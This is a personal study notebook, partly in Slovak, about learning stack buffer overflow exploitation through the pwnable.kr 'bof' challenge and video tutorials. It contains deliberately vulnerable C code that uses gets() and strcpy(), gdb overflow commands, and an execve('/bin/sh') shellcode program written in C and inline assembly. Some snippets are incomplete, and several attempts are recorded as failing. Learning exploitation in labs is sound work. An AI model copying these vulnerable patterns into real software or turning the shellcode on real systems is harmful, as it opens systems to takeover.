Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

bof.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

------------------------------------------------------------
https://linuxhint.com/nc-command-examples/

nc = netcat command umoznuje
network tool that allows users to transfer files between devices, scan ports and diagnose problems. 

gdb
file bof
disassemble nazov_func

dam breakpoint na potrebne miesto
break *0x080484bb




--------------------------buffer overflow computerophile

#include <stdio.h>
#include <string.h>

int main (int argc, char** argv)
{
	char buffer[500];
	strcpy(buffer, argv[1]);

	return 0;
}


gcc -m32 -g -fno-stack-protector -o vuln vuln.c

chyba
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory

sudo apt-get install gcc-multilib

gdb vuln
run Hello
// exited normally
disas main
list

run $(python -c 'print "\x41" * 506')
info registers

------------otazka bola polozena, neviem preco aj instruction pointer nie je prepisany, idem skusit tento druhy tutorial

-> je to zrejme kvoli memory randomization 
https://gist.github.com/apolloclark/6cffb33f179cc9162d0a

toto tam mam povodne
cat /proc/sys/kernel/randomize_va_space
2

//urobil som podla clanku ale stale je eip neprepisany



https://www.youtube.com/watch?v=hJ8IwyhqzD4

gcc -m32 -g -fno-stack-protector -o example example.c

gdb ./example

finding starts of buffer:
disas main
hladam call strcpy@plt a zoberiem adresu a dam breakpoint

break *adresa

run $(python -c "print('A'*256)")

Cannot insert breakpoint 1.
Cannot access memory at address 0x11ea
// cize neviem na dane meisto vlozit BP, neviem preco

============================================================
------skusim video hindi muza
https://www.youtube.com/watch?v=btkuAEbcQ80

#include <stdio.h>
#include <string.h>

void function(int a, int b, int c)
{
	char buffer1[5];
	char buffer2[10];


int main (int argc, char** argv)
{
	function(1,2,3);

	return 0;
}


frame pointer = ebp register - points to the current function frame

stack pointer = esp - points to the bottom of the stack


´teraz si napisem exploit z zh shellom

#include <stdio.h>
#include <stdlib.h>

void main(){
	char *name[2];
	
	name[0] = "/bin/sh";	/* exe filename */
	name[1] = NULL;
	execve(name[0], name, NULL);
	exit(0);
}

gcc -m32 -o exploit1 exploit1.c

ten isty program prepisany do ASM

#include <stdio.h>
#include <stdlib.h>

void main(){
asm(
	"movl $1f, %esi;"
	"movl %esi, 0x8(%esi);"
	"movb $0x0, 0x7(%esi);"
	"movl $0x0, 0xc(%esi);"
	"movl $0xb, %eax;"
	"movl %esi, %ebx;"
	"leal 0x8(%esi), %ecx;"
	"leal 0xc(%esi), %edx;"
	"int $0x80;"
	".section .data;"
	"1: .string \"/bin/sh	\";"
	".section .text;"
);
}

gcc -m32 -o exploit1 exploit1.c


teraz potrebujem z exploit1 vygenerovat object file
gcc -g -O -c -m32 exploit1.c

vygeneruje subor exploit1.o


objdump -disassemble-all exploit1
- ale nezobrazi instrukcie


================================Liveoverflow 

(gdb) info proc mappings
tymto sa pozriem ako vyzera stack

==========================NEFUNGUJE mi demonstracia
skusam stiahnut protostar

https://tox7cv3nom.medium.com/stack-overflow-bof-challenge-writeup-f047f01b2df2


gcc -g -O -c -m32 bof.c






====
https://ethicalhackingguru.com/the-buffer-overflow-guide-for-kali-linux/

https://samsclass.info/127/proj/p3-lbuf1.htm

https://security.stackexchange.com/questions/166279/cannot-overwrite-eip-in-basic-exploitation-example

https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html

https://pswalia2u.medium.com/r-3-4-4-buffer-overflow-vanilla-eip-overwrite-c205c2d3b1f7

https://jagskap.blogspot.com/2021/10/buffer-overflow-overview-part-i.html

----windows buffer overflow
https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/


--nejde prepisat eip
https://security.stackexchange.com/questions/166279/cannot-overwrite-eip-in-basic-exploitation-example
http://www.phearless.org/istorija/razno/buffer-overflow-example.txt
https://stackoverflow.com/questions/35471878/difference-between-exit-and-return-in-main-function-in-c

liveoverflow
https://www.youtube.com/watch?v=T03idxny9jE


=========================
hammond
https://www.youtube.com/watch?v=yJF0YPd8lDw


